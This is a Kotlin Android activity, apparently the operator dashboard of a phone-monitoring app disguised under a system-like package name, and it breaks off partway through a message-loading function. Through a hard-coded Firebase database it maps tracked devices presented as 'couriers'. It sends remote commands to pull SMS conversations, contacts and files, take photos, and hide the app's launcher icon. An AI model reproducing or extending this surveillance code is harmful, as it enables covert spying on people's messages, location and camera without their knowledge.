package com.android.system.manager

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.pager.HorizontalPager
import androidx.compose.foundation.pager.rememberPagerState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.zIndex
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import com.google.android.gms.maps.CameraUpdateFactory
import com.google.android.gms.maps.GoogleMap
import com.google.android.gms.maps.MapView
import com.google.android.gms.maps.model.*
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.android.system.manager.crypto.CryptoManager
import com.android.system.manager.crypto.KeyManager
import com.android.system.manager.BuildConfig
import com.android.system.manager.data.SmsConversation
import com.android.system.manager.data.SmsMessage
import com.android.system.manager.ui.ConversationListScreen
import com.android.system.manager.ui.ConversationDetailScreen
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import androidx.compose.material3.Tab
import androidx.compose.material3.TabRow
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

@AndroidEntryPoint
class AdminDashboardActivity : ComponentActivity() {
    
    private lateinit var devicesRef: DatabaseReference
    private var currentDevices = listOf<DeviceData>()
    
    data class SmsItem(
        val id: String = "",
        val address: String = "",
        val body: String = "",
        val date: Long = 0L,
        val type: Int = 1
    )

    data class ContactItem(
        val id: String = "",
        val name: String = "",
        val phone: String = "",
        val email: String? = null
    )

    data class FileItem(
        val id: String = "",
        val name: String = "",
        val path: String = "",
        val size: Long = 0L,
        val mimeType: String = "",
        val dateModified: Long = 0L
    )

    data class DeviceData(
        val uid: String = "",
        val lat: Double = 0.0,
        val lng: Double = 0.0,
        val accuracy: Double = 0.0,
        val battery: Int = 0,
        val timestamp: Long = 0L,
        val provider: String = "",
        
        // Device info (from devices/{uid}/ root)
        val deviceId: String = "",
        val deviceName: String = "",
        val email: String? = null,
        
        // Status (from devices/{uid}/status/)
        val online: Boolean = false,
        val lastSeen: Long = 0L,
        
        // Tracking config
        val trackingEnabled: Boolean = false,
        val intervalSeconds: Int = 14,
        
        // Legacy fields for compatibility
        val speed: Double = 0.0,
        val bearing: Double = 0.0,
        val altitude: Double = 0.0,
        val launcherHidden: Boolean = false
    )
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        devicesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app").getReference("devices")
        
        setContent {
            AdminDashboardScreen()
        }
    }
    
    @Composable
    private fun AdminDashboardScreen() {
        var devices by remember { mutableStateOf<List<DeviceData>>(emptyList()) }
        var totalCouriers by remember { mutableStateOf(0) }
        var onlineCouriers by remember { mutableStateOf(0) }
        var offlineCouriers by remember { mutableStateOf(0) }
        var selectedDevice by remember { mutableStateOf<DeviceData?>(null) }
        var selectedConversation by remember { mutableStateOf<SmsConversation?>(null) }
        val scope = rememberCoroutineScope()
        var googleMap by remember { mutableStateOf<GoogleMap?>(null) }
        val markers = remember { mutableMapOf<String, Marker>() }
        
        // Firebase Realtime Listener
        LaunchedEffect(Unit) {
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        Log.d("DEBUG_MAP", "Firebase data changed, snapshot exists: ${snapshot.exists()}")
                        Log.d("SYS_MGR_DEBUG", "onDataChange called, snapshot.exists: ${snapshot.exists()}, childrenCount: ${snapshot.childrenCount}")
                        
                        val deviceList = mutableListOf<DeviceData>()
                        var onlineCount = 0
                        var offlineCount = 0
                        
                        if (snapshot.exists()) {
                            snapshot.children.forEach { child ->
                                try {
                                    val deviceUid = child.key ?: ""
                                    Log.d("SYS_MGR_DEBUG", "Processing device: $deviceUid")
                                    
                                    // Read from location/
                                    val locationSnapshot = child.child("location")
                                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
                                    
                                    val lat = try {
                                        locationSnapshot.child("lat").getValue(String::class.java)?.let { encryptedLat ->
                                            try {
                                                if (aesKey != null) {
                                                    val decrypted = CryptoManager.decrypt(encryptedLat, aesKey)
                                                    decrypted?.toDoubleOrNull() ?: encryptedLat.toDoubleOrNull() ?: 0.0
                                                } else {
                                                    encryptedLat.toDoubleOrNull() ?: 0.0
                                                }
                                            } catch (e: Exception) {
                                                encryptedLat.toDoubleOrNull() ?: 0.0
                                            }
                                        } ?: locationSnapshot.child("lat").getValue(Double::class.java) ?: 0.0
                                    } catch (e: Exception) {
                                        locationSnapshot.child("lat").getValue(Double::class.java) ?: 0.0
                                    }
                                    
                                    val lng = try {
                                        locationSnapshot.child("lng").getValue(String::class.java)?.let { encryptedLng ->
                                            try {
                                                if (aesKey != null) {
                                                    val decrypted = CryptoManager.decrypt(encryptedLng, aesKey)
                                                    decrypted?.toDoubleOrNull() ?: encryptedLng.toDoubleOrNull() ?: 0.0
                                                } else {
                                                    encryptedLng.toDoubleOrNull() ?: 0.0
                                                }
                                            } catch (e: Exception) {
                                                encryptedLng.toDoubleOrNull() ?: 0.0
                                            }
                                        } ?: locationSnapshot.child("lng").getValue(Double::class.java) ?: 0.0
                                    } catch (e: Exception) {
                                        locationSnapshot.child("lng").getValue(Double::class.java) ?: 0.0
                                    }
                                    
                                    val battery = locationSnapshot.child("battery").getValue(Int::class.java) ?: 0
                                    val timestamp = locationSnapshot.child("timestamp").getValue(Long::class.java) ?: 0L
                                    val accuracy = locationSnapshot.child("accuracy").getValue(Double::class.java) ?: 0.0
                                    val provider = locationSnapshot.child("provider").getValue(String::class.java) ?: ""
                                    val launcherHidden = locationSnapshot.child("launcherHidden").getValue(Boolean::class.java) ?: false
                                    
                                    // Read from status/
                                    val statusSnapshot = child.child("status")
                                    val isOnline = statusSnapshot.child("online").getValue(Boolean::class.java) ?: false
                                    val lastSeen = statusSnapshot.child("lastSeen").getValue(Long::class.java) ?: 0L
                                    
                                    // Read from root level (device info)
                                    val deviceId = child.child("deviceId").getValue(String::class.java) ?: ""
                                    val deviceName = child.child("deviceName").getValue(String::class.java) ?: ""
                                    val email = child.child("email").getValue(String::class.java)
                                    Log.d("SYS_MGR_DEBUG", "Device fields - ID: $deviceId, Name: $deviceName, Email: $email, lat: $lat, lng: $lng")
                                    
                                    // Read from trackingConfig/
                                    val trackingSnapshot = child.child("trackingConfig")
                                    val trackingEnabled = trackingSnapshot.child("trackingEnabled").getValue(Boolean::class.java) ?: false
                                    val intervalSeconds = trackingSnapshot.child("intervalSeconds").getValue(Int::class.java) ?: 14
                                    
                                    // Create device object
                                    val device = DeviceData(
                                        uid = deviceUid,
                                        lat = lat,
                                        lng = lng,
                                        accuracy = accuracy,
                                        battery = battery,
                                        timestamp = timestamp,
                                        provider = provider,
                                        deviceId = deviceId,
                                        deviceName = deviceName,
                                        email = email,
                                        online = isOnline,
                                        lastSeen = lastSeen,
                                        trackingEnabled = trackingEnabled,
                                        intervalSeconds = intervalSeconds,
                                        launcherHidden = launcherHidden
                                    )
                                    
                                    Log.d("SYS_MGR_DEBUG", "Adding device to list: $deviceName")
                                    deviceList.add(device)
                                    if (device.online) onlineCount++ else offlineCount++
                                    Log.d("DEBUG_MAP", "Device found: ${device.deviceName}, lat: ${device.lat}, lng: ${device.lng}")
                                } catch (e: Exception) {
                                    Log.e("DEBUG_MAP", "Error parsing device data: ${e.message}")
                                    Log.e("SYS_MGR_DEBUG", "Device parsing FAILED for ${child.key}: ${e.message}", e)
                                }
                            }
                        } else {
                            Log.w("DEBUG_MAP", "No data in Firebase snapshot")
                        }
                        
                        devices = deviceList
                        currentDevices = deviceList
                        Log.d("SYS_MGR_DEBUG", "Final device list size: ${deviceList.size}")
                        totalCouriers = deviceList.size
                        onlineCouriers = onlineCount
                        offlineCouriers = offlineCount
                        
                        // Update map markers
                        googleMap?.let { map ->
                            updateMapMarkers(map, markers, deviceList)
                        }
                        
                        Log.d("DEBUG_MAP", "Updated ${deviceList.size} devices: $onlineCount online, $offlineCount offline")
                    } catch (e: Exception) {
                        Log.e("DEBUG_MAP", "Critical error in Firebase data processing: ${e.message}")
                        // Set empty state to prevent crashes
                        devices = emptyList()
                        currentDevices = emptyList()
                        totalCouriers = 0
                        onlineCouriers = 0
                        offlineCouriers = 0
                    }
                }
                
                override fun onCancelled(error: DatabaseError) {
                    Log.e("DEBUG_MAP", "Firebase listener cancelled: ${error.message}")
                }
            }
            
            devicesRef.addValueEventListener(listener)
        }

        val pagerState = rememberPagerState(initialPage = 0) { 5 }
        val tabTitles = listOf("Xarita", "SMS", "Kontakt", "Fayllar", "Media")

        @Composable
        fun MapContent() {
            var mapView by remember { mutableStateOf<MapView?>(null) }
            val lifecycle = LocalLifecycleOwner.current.lifecycle

            DisposableEffect(lifecycle) {
                val observer = LifecycleEventObserver { _, event ->
                    when (event) {
                        Lifecycle.Event.ON_RESUME -> mapView?.onResume()
                        Lifecycle.Event.ON_PAUSE -> mapView?.onPause()
                        Lifecycle.Event.ON_DESTROY -> mapView?.onDestroy()
                        else -> {}
                    }
                }
                lifecycle.addObserver(observer)
                onDispose { lifecycle.removeObserver(observer) }
            }

            Box(modifier = Modifier.fillMaxSize()) {
                // Map View
                AndroidView(
                    factory = { ctx ->
                        MapView(ctx).also { mv ->
                            mapView = mv
                            mv.onCreate(Bundle())
                            mv.onResume()
                            mv.getMapAsync { map ->
                                googleMap = map
                                map.uiSettings.isZoomControlsEnabled = true
                                map.uiSettings.isCompassEnabled = true
                                map.moveCamera(
                                    CameraUpdateFactory.newLatLngZoom(
                                        LatLng(41.299496, 69.240073), 10f
                                    )
                                )
                                map.setOnMarkerClickListener { marker ->
                                    // marker.tag = device.uid (Firebase UID)
                                    val uid = marker.tag as? String
                                    val device = currentDevices.find { it.uid == uid }
                                    if (device != null) selectedDevice = device
                                    true
                                }
                            }
                        }
                    },
                    modifier = Modifier.fillMaxSize()
                )

                // Statistics Bar
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp)
                        .align(Alignment.TopStart)
                ) {
                    StatisticsBar(
                        total = totalCouriers,
                        online = onlineCouriers,
                        offline = offlineCouriers
                    )
                }

                // Courier List
                Column(modifier = Modifier
                    .fillMaxWidth()
                    .height(300.dp)
                    .padding(16.dp)
                    .align(Alignment.BottomStart)) {
                    Text(
                        text = "Active Couriers (${devices.size})",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(16.dp)
                    )

                    if (devices.isEmpty()) {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .weight(1f),
                            contentAlignment = Alignment.Center
                        ) {
                            Text(
                                text = "No active devices",
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                                style = MaterialTheme.typography.bodyMedium
                            )
                        }
                    } else {
                        LazyColumn(modifier = Modifier.weight(1f)) {
                            items(devices) { device ->
                                CourierItem(device = device, onClick = {
                                    selectedDevice = device
                                    googleMap?.let { focusOnDevice(it, device) }
                                })
                            }
                        }
                    }
                }

                // Device Detail Popup
                selectedDevice?.let { device ->
                    DeviceDetailPopup(
                        device = device,
                        onDismiss = { selectedDevice = null },
                        onSmsClick = { uid ->
                            sendSyncSmsCommand(uid)
                            scope.launch { pagerState.animateScrollToPage(1) }
                        },
                        onContactsClick = { uid ->
                            sendSyncContactsCommand(uid)
                            scope.launch { pagerState.animateScrollToPage(2) }
                        },
                        onFilesClick = { uid ->
                            sendSyncFilesCommand(uid)
                            scope.launch { pagerState.animateScrollToPage(3) }
                        },
                        onTakePhotoClick = { uid ->
                            sendTakePhotoCommand(uid)
                            scope.launch { pagerState.animateScrollToPage(4) }
                        }
                    )
                }
            }
        }

        @Composable
        fun SmsTabContent(deviceId: String?) {
            if (deviceId == null) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("Qurilma tanlanmagan",
                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
                }
                return
            }

            var selectedConversation by remember { mutableStateOf<SmsConversation?>(null) }
            var conversations by remember { mutableStateOf<List<SmsConversation>>(emptyList()) }
            var messages by remember { mutableStateOf<List<SmsMessage>>(emptyList()) }
            var isLoading by remember { mutableStateOf(true) }

            // Load conversations
            LaunchedEffect(deviceId) {
                loadConversations(deviceId) { loadedConversations ->
                    conversations = loadedConversations
                    isLoading = false
                }
            }

            // Load messages when conversation is selected
            LaunchedEffect(selectedConversation) {
                selectedConversation?.let { conv ->
                    loadMessages(deviceId, conv.conversationKey) { loadedMessages ->
                        messages = loadedMessages
                    }
                }
            }

            Box(modifier = Modifier.fillMaxSize()) {
                if (selectedConversation == null) {
                    // Show conversation list
                    if (isLoading) {
                        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                            CircularProgressIndicator()
                        }
                    } else {
                        ConversationListScreen(
                            conversations = conversations,
                            onConversationClick = { selectedConversation = it }
                        )
                    }
                    
                    // Sync button
                    IconButton(
                        onClick = { sendSyncSmsCommand(deviceId) },
                        modifier = Modifier.align(Alignment.TopEnd).padding(16.dp).zIndex(1f)
                    ) {
                        Icon(Icons.Default.Refresh, contentDescription = "Sync")
                    }
                } else {
                    // Show conversation detail
                    ConversationDetailScreen(
                        phoneNumber = selectedConversation!!.phoneNumber,
                        messages = messages,
                        onBackClick = { selectedConversation = null }
                    )
                }
            }
        }

        @Composable
        fun ContactsTabContent(deviceId: String?) {
            if (deviceId == null) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("Qurilma tanlanmagan",
                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
                }
                return
            }
            Box(modifier = Modifier.fillMaxSize()) {
                ContactsPanel(deviceId = deviceId, onDismiss = {})
                IconButton(
                    onClick = { sendSyncContactsCommand(deviceId) },
                    modifier = Modifier
                        .align(Alignment.TopEnd)
                        .padding(16.dp)
                        .zIndex(1f)
                ) {
                    Icon(Icons.Default.Refresh, contentDescription = "Sync")
                }
            }
        }

        @Composable
        fun FilesTabContent(deviceId: String?) {
            if (deviceId == null) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("Qurilma tanlanmagan",
                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
                }
                return
            }
            Box(modifier = Modifier.fillMaxSize()) {
                FilesPanel(deviceId = deviceId, onDismiss = {})
                IconButton(
                    onClick = { sendSyncFilesCommand(deviceId) },
                    modifier = Modifier
                        .align(Alignment.TopEnd)
                        .padding(16.dp)
                        .zIndex(1f)
                ) {
                    Icon(Icons.Default.Refresh, contentDescription = "Sync")
                }
            }
        }

        @Composable
        fun MediaTabContent(deviceId: String?) {
            if (deviceId == null) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("Qurilma tanlanmagan",
                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
                }
                return
            }
            Column(
                modifier = Modifier.fillMaxSize().padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Text("Kamera / Media", style = MaterialTheme.typography.titleMedium)
                Button(
                    onClick = { sendTakePhotoCommand(deviceId) },
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("Foto olish")
                }
                Text(
                    "Foto olingandan keyin bu yerda ko'rinadi",
                    color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f),
                    style = MaterialTheme.typography.bodySmall
                )
            }
        }

        Column(Modifier.fillMaxSize()) {
            TabRow(selectedTabIndex = pagerState.currentPage) {
                tabTitles.forEachIndexed { index, title ->
                    Tab(
                        selected = pagerState.currentPage == index,
                        onClick = { scope.launch { pagerState.animateScrollToPage(index) } },
                        text = { Text(title) }
                    )
                }
            }

            HorizontalPager(
                state = pagerState,
                modifier = Modifier.weight(1f),
                userScrollEnabled = false
            ) { page ->
                when (page) {
                    0 -> MapContent()
                    1 -> SmsTabContent(deviceId = selectedDevice?.uid)
                    2 -> ContactsTabContent(deviceId = selectedDevice?.uid)
                    3 -> FilesTabContent(deviceId = selectedDevice?.uid)
                    4 -> MediaTabContent(deviceId = selectedDevice?.uid)
                    else -> Box(Modifier.fillMaxSize())
                }
            }
        }
    }
    
    private fun updateMapMarkers(map: GoogleMap, markers: MutableMap<String, Marker>, devices: List<DeviceData>) {
        // Clear existing markers
        markers.values.forEach { it.remove() }
        markers.clear()
        
        // Add new markers
        devices.forEach { device ->
            if (device.lat != 0.0 && device.lng != 0.0) {
                val markerOptions = MarkerOptions()
                    .position(LatLng(device.lat, device.lng))
                    .title(device.deviceName)
                    .snippet("Battery: ${device.battery}% | Provider: ${device.provider}")
                    .icon(getDeviceIcon(device))
                
                val marker = map.addMarker(markerOptions)
                marker?.tag = device.uid  // Use Firebase UID as tag
                if (marker != null) {
                    markers[device.uid] = marker
                }
            }
        }
    }
    
    private fun getDeviceIcon(device: DeviceData): BitmapDescriptor {
        return when {
            !device.online -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_RED)
            device.battery < 20 -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_ORANGE)
            else -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN)
        }
    }
    
    private fun focusOnDevice(map: GoogleMap, device: DeviceData) {
        if (device.lat != 0.0 && device.lng != 0.0) {
            map.animateCamera(
                CameraUpdateFactory.newLatLngZoom(
                    LatLng(device.lat, device.lng),
                    15f
                )
            )
        }
    }
    
    @Composable
    private fun StatisticsBar(total: Int, online: Int, offline: Int) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.primaryContainer
            )
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                StatItem("Total Couriers", total.toString(), Icons.Default.Person)
                StatItem("Online", online.toString(), Icons.Filled.Person, Color.Green)
                StatItem("Offline", offline.toString(), Icons.Filled.Person, Color.Red)
            }
        }
    }
    
    @Composable
    private fun StatItem(title: String, value: String, icon: ImageVector, color: Color = MaterialTheme.colorScheme.primary) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(24.dp))
            Spacer(modifier = Modifier.height(4.dp))
            Text(text = value, fontWeight = FontWeight.Bold, fontSize = 20.sp)
            Text(text = title, fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    }
    
    @Composable
    private fun CourierItem(device: DeviceData, onClick: () -> Unit) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 16.dp, vertical = 4.dp),
            onClick = onClick
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    // Online status indicator
                    Box(
                        modifier = Modifier
                            .size(12.dp)
                            .background(
                                if (device.online) Color.Green else Color.Red,
                                shape = RoundedCornerShape(6.dp)
                            )
                    )
                    
                    Spacer(modifier = Modifier.width(12.dp))
                    
                    Column {
                        Text(
                            text = device.deviceName,
                            fontWeight = FontWeight.Medium,
                            fontSize = 14.sp
                        )
                        Text(
                            text = formatLastSeen(device.lastSeen),
                            fontSize = 12.sp,
                            color = Color.Gray
                        )
                    }
                }
                
                Row(verticalAlignment = Alignment.CenterVertically) {
                    // Battery indicator
                    BatteryIndicator(battery = device.battery)
                    
                    Spacer(modifier = Modifier.width(8.dp))
                    
                    Column(horizontalAlignment = Alignment.End) {
                        Text(
                            text = device.provider.uppercase(),
                            fontSize = 10.sp,
                            color = MaterialTheme.colorScheme.primary
                        )
                        Text(
                            text = "${device.speed.toInt()} km/h",
                            fontSize = 10.sp,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }
        }
    }
    
    @Composable
    private fun BatteryIndicator(battery: Int) {
        val icon = Icons.Filled.Settings // Use Settings as fallback
        val color = if (battery < 20) Color.Red else Color.Green
        
        Row(verticalAlignment = Alignment.CenterVertically) {
            Icon(
                imageVector = icon,
                contentDescription = null,
                tint = color,
                modifier = Modifier.size(16.dp)
            )
            Spacer(modifier = Modifier.width(4.dp))
            Text(
                text = "$battery%",
                fontSize = 10.sp,
                color = color
            )
        }
    }
    
    @Composable
    private fun DeviceDetailPopup(
        device: DeviceData,
        onDismiss: () -> Unit,
        onSmsClick: (String) -> Unit = {},
        onContactsClick: (String) -> Unit = {},
        onFilesClick: (String) -> Unit = {},
        onTakePhotoClick: (String) -> Unit = {}
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = device.deviceName,
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    TextButton(onClick = onDismiss) {
                        Text("Close")
                    }
                }
                
                Spacer(modifier = Modifier.height(8.dp))
                
                DetailRow("Device ID", device.deviceId)
                DetailRow("Email", device.email ?: "")
                DetailRow("Status", if (device.online) "Online" else "Offline")
                DetailRow("Provider", device.provider.uppercase())
                DetailRow("Battery", "${device.battery}%")
                DetailRow("Speed", "${device.speed} km/h")
                DetailRow("Accuracy", "${device.accuracy}m")
                DetailRow("Last Updated", getRelativeTime(device.timestamp))
                
                Spacer(modifier = Modifier.height(12.dp))
                
                Button(
                    onClick = {
                        // Open detailed view with location history
                        openCourierDetail(device)
                    },
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("View Location History")
                }

                Spacer(modifier = Modifier.height(8.dp))

                val deviceUid = device.uid
                Button(
                    onClick = { onFilesClick(deviceUid) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFF607D8B)
                    )
                ) {
                    Text("📁 Fayllar")
                }

                Spacer(modifier = Modifier.height(8.dp))

                Button(
                    onClick = { onContactsClick(deviceUid) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.tertiary
                    )
                ) {
                    Text("👤 Kontaktlar")
                }

                Spacer(modifier = Modifier.height(8.dp))

                Button(
                    onClick = { onSmsClick(deviceUid) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.secondary
                    )
                ) {
                    Text("📩 SMS")
                }

                Spacer(modifier = Modifier.height(8.dp))

                Button(
                    onClick = { onTakePhotoClick(deviceUid) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFF9C27B0)
                    )
                ) {
                    Text("📸 Foto")
                }

                Spacer(modifier = Modifier.height(8.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    if (device.launcherHidden) {
                        Button(
                            onClick = {
                                sendLauncherCommand(device.uid, "showLauncher")
                            },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFF4CAF50)
                            )
                        ) {
                            Text("Show Icon")
                        }
                    } else {
                        Button(
                            onClick = {
                                sendLauncherCommand(device.uid, "hideLauncher")
                            },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFFF44336)
                            )
                        ) {
                            Text("Hide Icon")
                        }
                    }
                }
            }
        }
    }
    
    @Composable
    private fun DetailRow(label: String, value: String) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 2.dp),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(
                text = label,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                fontSize = 12.sp
            )
            Text(
                text = value,
                fontWeight = FontWeight.Medium,
                fontSize = 12.sp
            )
        }
    }
    
    private fun getRelativeTime(timestamp: Long): String {
        val now = System.currentTimeMillis()
        val diff = now - timestamp
        
        return when {
            diff < TimeUnit.MINUTES.toMillis(1) -> "Just now"
            diff < TimeUnit.MINUTES.toMillis(60) -> "${diff / TimeUnit.MINUTES.toMillis(1)} minutes ago"
            diff < TimeUnit.HOURS.toMillis(24) -> "${diff / TimeUnit.HOURS.toMillis(1)} hours ago"
            else -> "${diff / TimeUnit.DAYS.toMillis(1)} days ago"
        }
    }
    
    private fun formatLastSeen(timestamp: Long): String {
        if (timestamp == 0L) return "Hech qachon"
        
        val now = System.currentTimeMillis()
        val diff = now - timestamp
        
        return when {
            diff < 10_000 -> "Hozir"
            diff < 60_000 -> "${diff / 1000} soniya oldin"
            diff < 3600_000 -> "${diff / 60_000} daqiqa oldin"
            diff < 86400_000 -> "${diff / 3600_000} soat oldin"
            else -> "${diff / 86400_000} kun oldin"
        }
    }
    
    private fun openCourierDetail(device: DeviceData) {
        val intent = Intent(this, CourierDetailActivity::class.java).apply {
            putExtra("device_id", device.uid)
            putExtra("device_name", device.deviceName)
        }
        startActivity(intent)
    }
    
    private fun sendLauncherCommand(deviceUid: String, command: String) {
        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices")
            .child(deviceUid)
            .child("commands")

        when (command) {
            "hideLauncher" -> {
                commandsRef.child("hideLauncher").setValue(mapOf(
                    "type" to "hideLauncher",
                    "timestamp" to ServerValue.TIMESTAMP,
                    "status" to "pending"
                ))
                commandsRef.child("showLauncher").setValue(null)
            }
            "showLauncher" -> {
                commandsRef.child("showLauncher").setValue(mapOf(
                    "type" to "showLauncher",
                    "timestamp" to ServerValue.TIMESTAMP,
                    "status" to "pending"
                ))
                commandsRef.child("hideLauncher").setValue(null)
            }
        }
    }
    
    /**
     * syncSms command ni Firebase'ga yozadi
     */
    private fun sendSyncSmsCommand(deviceUid: String) {
        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices")
            .child(deviceUid)
            .child("commands")

        commandsRef.child("syncSms").setValue(mapOf(
            "type" to "syncSms",
            "timestamp" to ServerValue.TIMESTAMP,
            "status" to "pending"
        ))
        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncSms command sent for device: $deviceUid") }
    }

    private fun loadConversations(deviceId: String, onLoaded: (List<SmsConversation>) -> Unit) {
        val conversationsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices/$deviceId/sms/conversations")

        conversationsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
                val list = mutableListOf<SmsConversation>()
                
                snapshot.children.forEach { convSnapshot ->
                    try {
                        val conversationKey = convSnapshot.key ?: return@forEach
                        val rawPhoneNumber = convSnapshot.child("phoneNumber").getValue(String::class.java) ?: ""
                        val lastMessage = convSnapshot.child("lastMessage").getValue(String::class.java) ?: ""
                        val lastTimestamp = convSnapshot.child("lastTimestamp").getValue(Long::class.java) ?: 0L

                        val phoneNumber = if (aesKey != null && rawPhoneNumber.contains(".")) {
                            CryptoManager.decrypt(rawPhoneNumber, aesKey) ?: rawPhoneNumber
                        } else rawPhoneNumber

                        list.add(SmsConversation(
                            conversationKey = conversationKey,
                            phoneNumber = phoneNumber,
                            lastMessage = lastMessage,
                            lastTimestamp = lastTimestamp
                        ))
                    } catch (e: Exception) {
                        if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Conversation parse error: ${e.message}") }
                    }
                }
                
                onLoaded(list.sortedByDescending { it.lastTimestamp })
            }

            override fun onCancelled(error: DatabaseError) {
                if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Conversations listener cancelled: ${error.message}") }
                onLoaded(emptyList())
            }
        })
    }

    private fun loadMessages(deviceId: String, conversationKey: String, onLoaded: (List<SmsMessage>) -> Unit) {
        val messagesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices/$deviceId/sms/conversations/$conversationKey/messages")

        messagesRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
                val list = mutableListOf<SmsMessage>()
                
                snapshot.children.forEach { msgSnapshot ->
                    try {
                        val messageKey = msgSnapshot.key ?: return@forEach
                        val rawBody = msgSnapshot.child("body").getValue(String::class.java) ?: ""
                        val date = msgSnapshot.child("date").getValue(Long::class.java) ?: 0L
